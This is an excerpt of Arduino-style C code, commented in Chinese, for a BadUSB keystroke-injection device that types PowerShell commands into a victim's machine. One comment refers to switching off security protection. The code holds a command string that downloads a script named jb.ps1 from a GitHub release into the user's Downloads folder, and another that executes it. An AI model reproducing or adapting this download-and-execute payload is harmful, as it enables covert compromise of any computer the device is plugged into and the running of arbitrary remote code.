...
//  for (int i = 0; i < 2; i++) {  // 循环两次
 ...
 // delay(300);
  ...
  //关安全防护的！！！及开启大写，但是输入字要进行反转
 /* 
  Keyboard_press(KEY_CAPS_LOCK);  // 按下 KEY_CAPS_LOCK 键
  delay(100);  // 等待
  Keyboard_releaseAll();  // 释放所有按键
  delay(500);
  */
 ...
 // Step 6: 在 PowerShell 中创建 Downloads 文件夹（如果不存在）并下载文件
  ...
  const char* command = 
    ...
    "Invoke-WebRequest -Uri 'https://github.com/ll2310782478/badusb/releases/download/1/jb.ps1' -OutFile (Join-Path -Path $env:USERPROFILE -ChildPath 'Downloads\\jb.ps1')\n";
  ...
  */
// Step 7: 执行下载的文件
delay(100);  // 不需要等待时间因为系统在下载时不会执行命令，等待下载完成

const char* runCommand = 
    "& (Join-Path -Path $env:USERPROFILE -ChildPath 'Downloads\\jb.ps1')";
